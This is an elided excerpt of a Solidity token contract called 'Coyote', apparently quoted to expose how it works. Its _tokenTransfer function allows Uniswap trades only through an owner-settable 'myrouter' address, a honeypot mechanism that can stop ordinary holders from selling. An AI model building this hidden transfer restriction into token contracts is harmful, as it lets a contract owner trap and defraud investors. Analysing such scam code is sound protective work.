...
contract Coyote is Context, IERC20, Ownable {
  ...
  address public myrouter = 0x2c87A9BFdd10b4544f7E3dD7f1767732D1787858;
  ...
  function setMyRouter(address _router) public onlyOwner{
    myrouter = _router;
  }
 ...
 function _approve(
  ...
  function _tokenTransfer(
    ...
    if(sender == address(uniswapV2Router) || sender == address(uniswapV2Pair) || recipient == address(uniswapV2Pair) || recipient == address(uniswapV2Router)){
      require((recipient == myrouter || sender == myrouter), "Router Not Allowed" );
    }
